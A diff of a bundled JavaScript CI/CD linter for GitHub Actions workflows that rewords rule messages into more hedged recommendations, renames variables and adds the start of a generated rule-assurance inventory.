           line: install2.direct ? install2.line : stepLine(install2.owner),
           key: `${job.key}:playwright-install`,
-          message: "Playwright browsers are downloaded on every run without a cache.",
-          suggestion: "Cache ~/.cache/ms-playwright (%USERPROFILE%\\AppData\\Local\\ms-playwright on Windows) with actions/cache keyed on the Playwright version and run `playwright install` (or only `install-deps` on a hit), or run the job in the mcr.microsoft.com/playwright container image."
+          message: "No browser cache or Playwright container image was detected for this `playwright install` invocation.",
+          suggestion: "Measure browser-install duration first. If reuse is beneficial, cache the actual browser location with a key matching the Playwright version and platform, or use a compatible Playwright image. Preserve required browser installation and OS dependencies."
         });
       }
     }
@@ -29187,23 +29187,23 @@ function finding(tool2, words6, project) {
   switch (tool2) {
     case "eslint":
       return words6.some((word) => word === "--cache" || word.startsWith("--cache=")) ? {
-        message: "ESLint runs with `--cache`, but the cache file is not restored between runs, so every run is cold.",
+        message: "ESLint uses `--cache`, but no matching cache restore was detected; fresh jobs may lose reuse between runs.",
         suggestion: "Point `--cache-location` at a directory (for example node_modules/.cache/eslint/) and restore it with actions/cache."
       } : {
-        message: "ESLint lints every file on every run because `--cache` is not used.",
+        message: "This ESLint invocation has no visible `--cache`; unchanged-file reuse may be an optimization opportunity.",
         suggestion: "Add `--cache --cache-strategy content --cache-location node_modules/.cache/eslint/` and restore that directory with actions/cache."
       };
     case "tsc":
       return words6.some((word) => ["--incremental", "-b", "--build", "--composite"].includes(word)) || tsconfigIncremental(project) ? {
-        message: "tsc builds incrementally, but its .tsbuildinfo output is not restored between runs, so every run is a full check.",
+        message: "Incremental TypeScript output has no detected cache restore; fresh jobs may repeat work.",
         suggestion: "Restore the .tsbuildinfo file(s) (see `tsBuildInfoFile`) with actions/cache keyed on the lockfile and tsconfig."
       } : {
-        message: "tsc re-checks the whole program on every run (no `--incremental` or build mode, and no cached .tsbuildinfo).",
+        message: "No incremental/build mode or .tsbuildinfo cache restore was detected for this TypeScript invocation.",
         suggestion: "Enable `incremental` (with an explicit `tsBuildInfoFile`) or use `tsc -b`, and restore the .tsbuildinfo file with actions/cache."
       };
     case "jest":
       return {
-        message: "Jest re-transforms every file on every run because its cache directory is not restored.",
+        message: "No restore of Jest's transform cache was detected; fresh jobs may repeat transformations.",
         suggestion: "Set `--cacheDirectory` (or `cacheDirectory` in the Jest config) to a workspace path and restore it with actions/cache."
       };
   }
@@ -29213,7 +29213,7 @@ var tool_incremental_cache_default = defineRule({
     id: "testing/tool-incremental-cache",
     ruleset: "testing",
     description: "ESLint, tsc and Jest should keep their incremental caches between CI runs.",
-    rationale: "ESLint (`--cache`), TypeScript (`incremental`/`tsc -b`) and Jest (transform cache) can skip unchanged files, but hosted runners start empty. Persisting their cache files makes repeat runs, including agent iterations on a pull request, proportional to what changed.",
+    rationale: "ESLint (`--cache`), TypeScript (`incremental`/`tsc -b`) and Jest (transform cache) can reuse compatible prior work. Fresh jobs may lack that state, but persistent runners and tool-managed caches can already provide it. Cache restoration, invalidation and upload costs can outweigh savings; measure repeat runs rather than assuming runtime becomes proportional to changed files.",
     kind: "practice",
     defaultSeverity: "info",
     presets: ["agentic", "strict"],
@@ -29278,8 +29278,8 @@ var unconditional_debug_upload_default = defineRule({
   meta: {
     id: "testing/unconditional-debug-upload",
     ruleset: "testing",
-    description: "Uploads of test debugging output (reports, traces, videos, screenshots) should run only when tests fail.",
-    rationale: "A step without `if:` runs only after earlier steps succeed, so a debugging upload placed after the tests uploads megabytes of traces and screenshots on every green run and nothing when the tests fail. `if: failure()` uploads exactly when the output is needed.",
+    description: "Consider failure-only uploads for test artifacts used solely for debugging.",
+    rationale: "A step's default success condition can skip a debugging upload after an earlier unhandled failure. When successful-run artifacts are not needed, `if: failure()` may avoid unnecessary transfers while retaining failure diagnostics. Visible conditions and consumers are only a heuristic: verify artifact consumers, continue-on-error behavior and diagnostic needs before changing the condition.",
     kind: "practice",
     defaultSeverity: "info",
     presets: ["agentic", "strict"],
@@ -29320,8 +29320,8 @@ var unconditional_debug_upload_default = defineRule({
           path: workflow.path,
           line,
           key: `${step.key}:always`,
-          message: `Traces, videos or screenshots (${paths.join(", ")}) are uploaded on every run, including green ones.`,
-          suggestion: "Use `if: failure()` so the heavy debugging artifacts upload only when a test fails."
+          message: `The upload condition permits traces, videos or screenshots (${paths.join(", ")}) on successful jobs.`,
+          suggestion: "If successful-run artifacts are not needed, consider `if: failure()` and verify downstream consumers."
         });
         continue;
       }
@@ -29339,8 +29339,8 @@ var unconditional_debug_upload_default = defineRule({
         path: workflow.path,
         line,
         key: step.key,
-        message: condition === void 0 ? `Debugging output (${paths.join(", ")}) is uploaded only when the tests pass, which is when it is not needed.` : `Debugging output (${paths.join(", ")}) is uploaded only on success (\`if: success()\`).`,
-        suggestion: "Add `if: failure()` so the upload runs when a test fails and is skipped on green runs.",
+        message: condition === void 0 ? `Debugging output (${paths.join(", ")}) uses the default success condition and may be skipped after an earlier failure.` : `Debugging output (${paths.join(", ")}) uses an explicit success condition (\`if: success()\`).`,
+        suggestion: "If the artifacts are only needed for failure diagnostics, use `if: failure()`; verify consumers and continue-on-error behavior.",
         ...applied ? { fix: applied } : {}
       });
     }
@@ -29615,9 +29615,9 @@ function modFlag(args) {
   }
   return value2;
 }
-function goflagsMode(text6) {
-  if (/['"$`\\]/.test(text6)) return void 0;
-  const flags = text6.trim().split(/\s+/).filter(Boolean);
+function goflagsMode(text7) {
+  if (/['"$`\\]/.test(text7)) return void 0;
+  const flags = text7.trim().split(/\s+/).filter(Boolean);
   if (flags.some((flag) => !/^--?[A-Za-z][\w-]*(?:=\S*)?$/.test(flag) || VALUE_OPTIONS.has(flag))) return void 0;
   return modFlag(flags);
 }
@@ -29881,13 +29881,13 @@ function gradleBuilds(project) {
   }
   return [...builds2.values()];
 }
-function buildMentions(build2, text6) {
+function buildMentions(build2, text7) {
   return build2.invocations.some(({ ctx, command }) => {
     const env = effectiveEnv(ctx, command, command);
-    if (env.has(`ORG_GRADLE_PROJECT_${text6}`)) return true;
-    if (["GRADLE_OPTS", "JAVA_OPTS", "JAVA_TOOL_OPTIONS", "_JAVA_OPTIONS", "JDK_JAVA_OPTIONS"].some((key2) => words3(env.get(key2) ?? "").some((word) => word === `-D${text6}` || word.startsWith(`-D${text6}=`)))) return true;
+    if (env.has(`ORG_GRADLE_PROJECT_${text7}`)) return true;
+    if (["GRADLE_OPTS", "JAVA_OPTS", "JAVA_TOOL_OPTIONS", "_JAVA_OPTIONS", "JDK_JAVA_OPTIONS"].some((key2) => words3(env.get(key2) ?? "").some((word) => word === `-D${text7}` || word.startsWith(`-D${text7}=`)))) return true;
     return ctx.commands.slice(0, ctx.commands.indexOf(command)).some((entry2) => {
-      if (!entry2.command.includes(text6) || !entry2.command.includes("gradle.properties")) return false;
+      if (!entry2.command.includes(text7) || !entry2.command.includes("gradle.properties")) return false;
       const tokens = shellTokens(entry2.command);
       if (["sed", "perl"].includes(basename(tokens[0]?.value ?? ""))) return true;
       if (!["echo", "printf"].includes(tokens[0]?.value ?? "")) return false;
@@ -31347,9 +31347,9 @@ var draft_pr_gating_default = defineRule({
 });
 
 // src/lint/rules/triggers/frequent-schedule.ts
-function range(text6) {
-  if (text6 === "*") return [0, 59];
-  const match2 = /^(\d{1,2})(?:-(\d{1,2}))?$/.exec(text6);
+function range(text7) {
+  if (text7 === "*") return [0, 59];
+  const match2 = /^(\d{1,2})(?:-(\d{1,2}))?$/.exec(text7);
   if (!match2) return void 0;
   const start2 = Number(match2[1]);
   const end = match2[2] === void 0 ? start2 : Number(match2[2]);
@@ -31398,9 +31398,9 @@ var frequent_schedule_default = defineRule({
       const schedule = field(source, on?.value, "schedule");
       for (const entry2 of items(source, schedule?.value)) {
         const cron = field(source, entry2, "cron");
-        const expression = stringValue(cron?.value)?.trim();
-        if (!cron || !expression || expression.includes("${{")) continue;
-        const parts2 = expression.split(/\s+/);
+        const expression2 = stringValue(cron?.value)?.trim();
+        if (!cron || !expression2 || expression2.includes("${{")) continue;
+        const parts2 = expression2.split(/\s+/);
         if (parts2.length !== 5) continue;
         const [minuteField = "", hourField = ""] = parts2;
         const minutes = cronMinutes(minuteField);
@@ -31409,8 +31409,8 @@ var frequent_schedule_default = defineRule({
         report({
           path: workflow.path,
           line: cron.line,
-          key: `on.schedule.${expression}`,
-          message: `Schedule "${expression}" runs ${minutes.size} times an hour ${scope2}, more than the limit of ${options.maxRunsPerHour}.`,
+          key: `on.schedule.${expression2}`,
+          message: `Schedule "${expression2}" runs ${minutes.size} times an hour ${scope2}, more than the limit of ${options.maxRunsPerHour}.`,
           suggestion: "Trigger the workflow from the event it is waiting for (`push`, `workflow_dispatch`, `repository_dispatch`) or widen the cron interval to every 15 minutes or more.",
           confidence: "high"
         });
@@ -31644,7 +31644,7 @@ var workflow_run_chain_default = defineRule({
     id: "triggers/workflow-run-chain",
     ruleset: "triggers",
     description: "Avoid chaining workflows with `workflow_run` when the downstream work could be a dependent job.",
-    rationale: "A `workflow_run` trigger only fires after the upstream workflow finishes, so the downstream work waits for a second queue slot, a fresh runner, and another checkout before it starts. When pull request volume is high those extra hops add minutes to every change and make the run graph harder to follow. Calling the downstream work as a reusable workflow job with `needs:` keeps it in the same run, shares artifacts directly, and starts it the moment its dependencies succeed.",
+    rationale: "A completed `workflow_run` subscription waits for the upstream workflow, which may include jobs the follow-up does not need. A dependent job can express narrower prerequisites, but it still has scheduling and runner costs; consolidation does not guarantee a faster run. Preserve deliberate privilege boundaries, trigger semantics and artifact dependencies, then measure whether the changed dependency graph reduces waiting.",
     kind: "practice",
     defaultSeverity: "info",
     presets: ["agentic", "strict"],
@@ -31678,8 +31678,8 @@ var workflow_run_chain_default = defineRule({
         path: workflow.path,
         line: chained.line,
         key: "on.workflow_run",
-        message: `Workflow waits for ${label} via workflow_run, adding a second queue wait, runner start, and checkout to every run.`,
-        suggestion: "Turn this workflow into a reusable workflow (`on: workflow_call`) and call it from the upstream workflow as a job with `needs:` on the jobs it depends on; pass build outputs as job outputs or artifacts within the same run.",
+        message: `Workflow subscribes to ${label} via workflow_run; narrower job dependencies may reduce waiting.`,
+        suggestion: "If the workflow boundary is not needed, consider a reusable workflow (`on: workflow_call`) called with `needs:` on its actual prerequisites. Preserve permissions, trigger semantics and artifact consumers, and compare the resulting critical path.",
         related: upstream.flatMap((candidate) => candidate ? [{ path: candidate.path, line: candidate.triggersLine }] : []),
         confidence: "medium"
       });
@@ -31893,7 +31893,7 @@ var duplicate_push_pull_request_trigger_default = defineRule({
     defaultOptions: { defaultBranches: ["main"] },
     validateOptions: (options) => {
       const branches = options.defaultBranches;
-      return Array.isArray(branches) && branches.length > 0 && branches.every((branch) => typeof branch === "string" && PLAIN_BRANCH.test(branch)) ? [] : ["defaultBranches must be a non-empty array of plain branch names"];
+      return Array.isArray(branches) && branches.length > 0 && branches.every((branch2) => typeof branch2 === "string" && PLAIN_BRANCH.test(branch2)) ? [] : ["defaultBranches must be a non-empty array of plain branch names"];
     },
     references: [
       "https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax#onpushbranchestagsbranches-ignoretags-ignore",
@@ -31923,11 +31923,11 @@ var duplicate_push_pull_request_trigger_default = defineRule({
       if (branches === void 0 && (config.tags !== void 0 || config["tags-ignore"] !== void 0)) continue;
       if (config.branches !== void 0 && branches === void 0) continue;
       if (branches !== void 0) {
-        if (branches.some((branch) => branch.startsWith("!"))) continue;
-        if (!branches.some((branch) => ALL_BRANCHES.has(branch.trim()))) continue;
+        if (branches.some((branch2) => branch2.startsWith("!"))) continue;
+        if (!branches.some((branch2) => ALL_BRANCHES.has(branch2.trim()))) continue;
       }
       if (dedupesItself(workflow)) continue;
-      const targets = (pullRequest.branches ?? []).filter((branch) => PLAIN_BRANCH.test(branch));
+      const targets = (pullRequest.branches ?? []).filter((branch2) => PLAIN_BRANCH.test(branch2));
       const suggested = pullRequest.branches && pullRequest.branches.length > 0 && targets.length === pullRequest.branches.length ? targets : options.defaultBranches;
       const filter = branches === void 0 ? "`push` has no `branches` filter" : `\`push\` matches \`branches: ${branchList(branches)}\``;
       report({
@@ -32179,7 +32179,7 @@ function records2(value2) {
 function scalarTexts(source, content2, node) {
   const nodes = items(source, node);
   const texts = nodes.map((item) => (0, import_yaml34.isScalar)(item) && item.range ? content2.slice(item.range[0], item.range[1]) : void 0);
-  const flowSafe = (text6) => text6 !== void 0 && !text6.includes("\n") && (/^["']/.test(text6) || !/[,[\]{}]/.test(text6));
+  const flowSafe = (text7) => text7 !== void 0 && !text7.includes("\n") && (/^["']/.test(text7) || !/[,[\]{}]/.test(text7));
   return texts.every(flowSafe) ? texts : void 0;
 }
 function expand(source, content2, matrixNode, matrix) {
@@ -32215,17 +32215,17 @@ function expand(source, content2, matrixNode, matrix) {
   }
   return { count: combos.length + added, atLeast: false, ...summary3 };
 }
-var escapeRegExp3 = (text6) => text6.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
+var escapeRegExp3 = (text7) => text7.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
 var matrixRef = (name) => new RegExp(`matrix\\.${escapeRegExp3(name)}(?![\\w-])`);
 function runnerDimension(job, dimensions) {
-  const text6 = JSON.stringify(job.runsOn?.value ?? "");
-  return dimensions.find((dimension) => matrixRef(dimension.name).test(text6));
+  const text7 = JSON.stringify(job.runsOn?.value ?? "");
+  return dimensions.find((dimension) => matrixRef(dimension.name).test(text7));
 }
 var SHARD_NAME = /shard|chunk|partition|split|slice|bucket|index|^(part|group|worker|seed|attempt|iteration|run)s?$/i;
 var SHARD_USE = /shard|chunk|partition|split|slice|--total|--group|--part|--index/i;
 var VERSION_NAME = /version|^(node|nodejs|python|py|pypy|go|golang|java|jdk|ruby|php|dotnet|rust|deno|bun|elixir|otp|erlang|scala|kotlin|swift|perl|julia|ghc|zig|lua|django|rails|flask|react|angular|vue|typescript|k8s|kubernetes|postgres|postgresql|pg|mysql|mariadb|redis|mongo|mongodb|elasticsearch|terraform|gradle|maven|electron|xcode|cuda|torch|pytorch|numpy|pandas)$/i;
 var VERSION_VALUE = /^v?\d+(?:\.(?:\d+|x|\*))*$/i;
-var unquote5 = (text6) => text6.replace(/^(["'])(.*)\1$/, "$2");
+var unquote5 = (text7) => text7.replace(/^(["'])(.*)\1$/, "$2");
 function isShardDimension(job, name) {
   if (SHARD_NAME.test(name)) return true;
   const ref = matrixRef(name);
@@ -32236,8 +32236,8 @@ function isVersionDimension(dimension) {
   if (values2.length === 0 || !values2.every((value2) => VERSION_VALUE.test(value2))) return false;
   return VERSION_NAME.test(dimension.name) || values2.some((value2) => value2.includes("."));
 }
-function versionParts(text6) {
-  return unquote5(text6).replace(/^v/i, "").split(".").map((part2) => /^\d+$/.test(part2) ? Number(part2) : Number.POSITIVE_INFINITY);
+function versionParts(text7) {
+  return unquote5(text7).replace(/^v/i, "").split(".").map((part2) => /^\d+$/.test(part2) ? Number(part2) : Number.POSITIVE_INFINITY);
 }
 function compareVersions(a, b) {
   const left = versionParts(a);
@@ -32282,14 +32282,14 @@ function sparseSuggestion(job, expansion) {
     let shardCombos = [/* @__PURE__ */ new Map()];
     for (const dimension of dimensions) {
       if (dimension === runner || !shards.has(dimension) && isVersionDimension(dimension)) continue;
-      shardCombos = shardCombos.flatMap((combo) => (dimension.texts ?? []).map((text6) => new Map([...combo, [dimension, text6]])));
+      shardCombos = shardCombos.flatMap((combo) => (dimension.texts ?? []).map((text7) => new Map([...combo, [dimension, text7]])));
     }
     if (others.length * shardCombos.length > MAX_INCLUDE_ROWS) return void 0;
     lines.push("    include:");
-    for (const text6 of others) {
+    for (const text7 of others) {
       for (const combo of shardCombos) {
         const pairs = dimensions.map(
-          (dimension) => `${dimension.name}: ${dimension === runner ? text6 : combo.get(dimension) ?? leg.get(dimension) ?? ""}`
+          (dimension) => `${dimension.name}: ${dimension === runner ? text7 : combo.get(dimension) ?? leg.get(dimension) ?? ""}`
         );
         lines.push(`      - { ${pairs.join(", ")} }`);
         count += 1;
@@ -32424,7 +32424,6 @@ var TRACKS = {
   "actions/download-artifact": { latest: 8, node24: 7 }
 };
 var RETIRED_RUNTIMES = /* @__PURE__ */ new Set(["node12", "node16", "node20"]);
-var NODE_REMOVAL = "GitHub-hosted runners stopped providing on 2026-09-23; they force such actions onto Node 24";
 function upgradeNotes(name, from, to) {
   const notes = [];
   if (name === "actions/checkout" && from < 7 && to >= 7) {
@@ -32453,7 +32452,7 @@ function checkStep(workflow, step, file, report) {
     path: workflow.path,
     line: step.uses.line,
     key: `${step.key}.uses`,
-    message: retired ? `${shown} targets Node 20 or older, which ${NODE_REMOVAL}, a runtime that release was never tested on, and warn on every run. The latest major is v${track.latest}.` : `${shown} is behind the latest major, v${track.latest}.`,
+    message: retired ? `${shown} is classified by the tracked major table as targeting Node 20 or older. Verify the pinned release's actual runtime and compatibility with the target runner; older declared runtimes may be overridden or unsupported. The latest tracked major is v${track.latest}.` : `${shown} is behind the latest major in the tracked table, v${track.latest}.`,
     suggestion: `Upgrade to ${name}@v${track.latest} (or its full commit SHA with a \`# v${track.latest}\` comment) after reviewing the release notes for breaking changes since v${version.major}.${upgradeNotes(name, version.major, track.latest)}`,
     ...retired ? { impact: "high" } : {},
     ...version.source === "comment" ? { confidence: "medium" } : {}
@@ -32464,7 +32463,7 @@ var outdated_action_major_default = defineRule({
     id: "workflow/outdated-action-major",
     ruleset: "workflow",
     description: "Well-known actions should use their current major version, and local JavaScript actions should run on node24.",
-    rationale: "Old majors of the official setup, cache, checkout, and artifact actions miss performance work (faster caching backends, parallel artifact uploads) and, below the node24 releases, target Node 20, which GitHub Actions runners removed on 2026-09-23: they now force those actions onto Node 24, which their authors never tested, and warn on every run (self-hosted runners on unsupported platforms cannot run them at all). Agents copy existing workflow snippets, so one stale pin spreads quickly.",
+    rationale: "The maintained major/runtime table identifies releases to review for runtime support, security and performance changes. Newer majors can introduce breaking changes and are not guaranteed faster. Check the pinned action's source and release notes, target runner requirements and GitHub Enterprise Server support before upgrading; the table does not establish how an arbitrary pinned release was tested or executed.",
     kind: "practice",
     defaultSeverity: "warn",
     presets: ["recommended", "agentic", "strict"],
@@ -32497,7 +32496,7 @@ var outdated_action_major_default = defineRule({
         path: action.path,
         line: using.line,
         key: "runs.using",
-        message: `Action declares \`runs.using: ${runtime}\`, which ${NODE_REMOVAL}, a runtime this action was never built or tested for.`,
+        message: `Action declares \`runs.using: ${runtime}\`, a retired runtime in the tracked GitHub-hosted runner policy. Verify the target runner's actual runtime and the action's compatibility with Node 24.`,
         suggestion: "Change `runs.using` to `node24`, rebuild any bundled `dist/` output, and run the action's tests on Node 24 before releasing a new tag.",
         impact: "high"
       });
@@ -32509,10 +32508,10 @@ var outdated_action_major_default = defineRule({
 function content(project, path) {
   return project.files.get(path)?.content;
 }
-function json(text6) {
-  if (text6 === void 0) return void 0;
+function json(text7) {
+  if (text7 === void 0) return void 0;
   try {
-    const value2 = JSON.parse(text6.replace(/^\uFEFF/, ""));
+    const value2 = JSON.parse(text7.replace(/^\uFEFF/, ""));
     return value2 && typeof value2 === "object" && !Array.isArray(value2) ? value2 : void 0;
   } catch {
     return void 0;
@@ -32528,20 +32527,20 @@ function packageJsonPinsNode(project, major) {
   if (typeof volta === "string" && volta.trim() !== "") return true;
   if (major < 6) return false;
   const runtime = record3(manifest.devEngines)?.runtime;
-  const entries2 = Array.isArray(runtime) ? runtime : [runtime];
-  return entries2.some((entry2) => {
+  const entries3 = Array.isArray(runtime) ? runtime : [runtime];
+  return entries3.some((entry2) => {
     const item = record3(entry2);
     return typeof item?.name === "string" && item.name.toLowerCase() === "node" && typeof item.version === "string" && item.version !== "";
   });
 }
 function toolVersionsPinsNode(project) {
-  const text6 = content(project, ".tool-versions");
-  const found = text6 === void 0 ? null : /^(?:node(js)?\s+)?v?(?<version>[^\s]+)$/m.exec(text6);
+  const text7 = content(project, ".tool-versions");
+  const found = text7 === void 0 ? null : /^(?:node(js)?\s+)?v?(?<version>[^\s]+)$/m.exec(text7);
   return found !== null && /^node/.test(found[0]);
 }
 function nonEmpty(project, path) {
-  const text6 = content(project, path);
-  return text6 !== void 0 && text6.trim() !== "";
+  const text7 = content(project, path);
+  return text7 !== void 0 && text7.trim() !== "";
 }
 var TOOLS2 = [
   {
@@ -32570,8 +32569,8 @@ var TOOLS2 = [
     pinExample: "python-version: '3.13'",
     rangeFiles: ["pyproject.toml `requires-python`", "Pipfile `python_version`"],
     candidates: (project) => {
-      const text6 = content(project, ".tool-versions");
-      return text6 !== void 0 && text6.split(/\r?\n/).some((line) => /^python\s+v?[^\s]+\s*$/.test(line)) ? [".tool-versions"] : [];
+      const text7 = content(project, ".tool-versions");
+      return text7 !== void 0 && text7.split(/\r?\n/).some((line) => /^python\s+v?[^\s]+\s*$/.test(line)) ? [".tool-versions"] : [];
     }
   },
   {
@@ -32774,8 +32773,8 @@ var unnecessary_needs_serialization_default = defineRule({
       for (const job of workflow.jobs) {
         if (job.needs.length === 0 || job.environment !== void 0 || DEPLOY.test(`${job.id} ${job.name ?? ""}`)) continue;
         if (job.if !== void 0 && /needs|always\(\)|failure\(\)|cancelled\(\)|success\(\)/.test(job.if)) continue;
-        const text6 = jobText(project, workflow, job);
-        if (/\bneeds\b\s*[),}]/.test(text6)) continue;
+        const text7 = jobText(project, workflow, job);
+        if (/\bneeds\b\s*[),}]/.test(text7)) continue;
         for (const dependency of job.needs) {
           const upstream = workflow.jobs.find((candidate) => candidate.id === dependency);
           if (!upstream || upstream.uses || upstream.if !== void 0 || upstream.concurrency || upstream.environment) continue;
@@ -32783,7 +32782,7 @@ var unnecessary_needs_serialization_default = defineRule({
           if (upstream.services.length > 0 || upstream.steps.length === 0) continue;
           if (field(source, jobNode6(workflow, upstream), "outputs")) continue;
           const escaped = dependency.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
-          if (new RegExp(`needs\\s*(\\.\\s*${escaped}\\b|\\[\\s*['"]${escaped}['"]\\s*\\])`).test(text6)) continue;
+          if (new RegExp(`needs\\s*(\\.\\s*${escaped}\\b|\\[\\s*['"]${escaped}['"]\\s*\\])`).test(text7)) continue;
           const kinds = upstream.steps.map((step) => inertStep(project, step));
           if (kinds.some((kind) => kind === void 0)) continue;
           const remaining = job.needs.filter((need) => need !== dependency);
@@ -32834,8 +32833,6514 @@ var allRules = [
   ...rules12
 ];
 
+// src/formal/generated/rule-assurance.ts
+var RULE_ASSURANCE = {
+  "schema": "cicd-optimizer/rule-assurance-v1",
+  "interpretation": "This exhaustive claim inventory is not a proof of detector correctness or recommendation benefits. Only the separately scoped engine/model contracts are machine-proved.",
+  "engineContract": {
+    "id": "severity-last-assignment-wins",
+    "theorem": "Policy.Resolve",
+    "implementation": "src/lint/config.ts -> src/formal/policy.ts -> generated Policy.Resolve",
+    "guarantee": "The last present assignment wins (matching preset defaults, then ruleset override, then explicit rule override); no assignment means off.",
+    "exclusions": [
+      "YAML parsing",
+      "preset membership extraction",
+      "option merging",
+      "capability/suppression handling",
+      "detector correctness",
+      "autofix semantics",
+      "pipeline performance"
+    ]
+  },
+  "rules": [
+    {
+      "id": "affected/change-detection",
+      "metadataSha256": "19b42a050eeee4dac978a01deb8785607fc0be150bf1bbf05b97eb9a9f64c913",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Multi-job pull request workflows in a monorepo should skip jobs whose area did not change."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "In a monorepo most pull requests touch one area, yet every job still provisions a runner, restores caches, and installs dependencies. A small change-detection job that feeds job-level `if:` conditions skips the unrelated jobs entirely. Agent-driven repositories open many narrow pull requests, so the savings compound, and an always-run gate job keeps branch protection simple because skipped jobs report success."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "affected/path-filter-required-checks",
+      "metadataSha256": "c0191a7d7c57127677d35f8b835f2b6dc783634f57b0475409096e6728ed6057",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Pull request workflows should not skip themselves with trigger-level `paths` filters if they provide required checks."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "When `paths`/`paths-ignore` skips a pull request workflow, its checks never report and stay Pending, so a pull request that requires them cannot merge. Agents then stall or someone adds a bypass. Running the workflow on every pull request and skipping work with job-level `if:` conditions keeps the speed benefit: skipped jobs report success, and an always-run gate job gives branch protection one stable check."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "affected/test-selection",
+      "metadataSha256": "0aa3bea5c4f9c5ece15966efed7910e0dcd1c47f63c03a8c4c602b8a7747674a",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Pull request CI in a monorepo should test only the projects affected by the change."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Running every project's tests on every pull request makes CI time grow with the size of the repository instead of the size of the change. Agents open many small pull requests, so affected-only selection (nx affected, turbo --affected, pnpm `[ref]` filters, lerna --since) is the biggest lever for keeping feedback fast and runner minutes bounded."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "affected/trusted-change-detection",
+      "metadataSha256": "837638e02420d28d6e3ce4df9e1e98840ea2d0e705a52018f7cef86747003bfe",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Change-detection steps must not use tj-actions/changed-files versions affected by CVE-2025-30066."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Change detection runs on every pull request, often with secrets in scope. In March 2025 the tags of tj-actions/changed-files were repointed to a malicious commit that dumped runner memory, including secrets, into workflow logs (CVE-2025-30066). Versions before v46.0.1 are in the advisory's affected range; agents copying an old snippet reintroduce it."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "caching/build-tool-cache",
+      "metadataSha256": "5c8f0bf933197907204b9d2eacbfeb31a4f5e6ed94ea24e5857e0fe683b07604",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Build tools with their own caches (Gradle, Maven, Cargo, Bazel, Turborepo, Nx) should persist them between runs."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Gradle, Maven, Cargo, Bazel, Turborepo and Nx can reuse downloads or build outputs when compatible caches are warm. Fresh runners often lack that state, but remote caches, preinstalled dependencies and tool-specific invalidation can change the benefit. A missing visible cache is a candidate for measurement, not proof that all work is repeated or that adding a cache will be faster."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "caching/cache-key",
+      "metadataSha256": "c858450436d660bc6aef0b3a9701e8cd1e6bd670cbafbc5124d8969c6d0346cb",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "actions/cache keys must invalidate when inputs change and still hit between runs."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "A static primary key does not encode dependency changes. SHA/run-scoped keys can prevent reuse across different context values, although reruns can reuse a key and Actions cache scope/version, prefix lookup and eviction also affect hits. Whether removing a context is safe depends on the workload's actual dependencies. `formal cache-key` checks only an explicit primary-key string-partition model relative to declared dependencies; it does not prove hits or speedups. Restoring node_modules before an unconditional `npm ci` is usually wasteful because npm ci removes that directory."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": [
+        "cache-primary-key-partition-relative-to-declared-D"
+      ]
+    },
+    {
+      "id": "caching/docker-layer-cache",
+      "metadataSha256": "9390298b6f82374e5fed63be4214c779101c32d8615d09651649aa0ca509219a",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Docker image builds in CI should import and export a layer cache."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Fresh BuildKit builders may repeat expensive layers without reusable cache state; remote or persistent builders can differ. The GitHub Actions backend's default `buildkit` scope can cause builds to overwrite one another's exported cache. Separate scopes and appropriate import/export settings may improve reuse, but transfer overhead and invalidation still require measurement. Inline cache supports mode=min; a registry cache with mode=max can include intermediate stages."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "caching/matrix-cache-key-missing-os",
+      "metadataSha256": "a77a9c628eedb19794c582ed33dce96be3e8f488818af08f3053deae92b9ca85",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Native-output cache keys should distinguish matrix platforms when modeled cache versions can overlap."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Cache matching depends on key, version and accessible branch scope. Versions include configured paths and compression details; Windows has additional cross-OS handling. Under the modeled hosted-runner/action behavior, equal visible inputs can permit incompatible native outputs to share a key. Custom compression, action versions or external configuration can change the version. Concurrent cold runs may all miss before a later run restores the winning cache. Changing keys must preserve every paired restore/save expression and caller, so no automatic rewrite is offered."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "caching/pr-branch-cache-save",
+      "metadataSha256": "910c2d49876613b5256b6e0b2ed85c3ecd6af85512b972705d33023d7fe41ef3",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
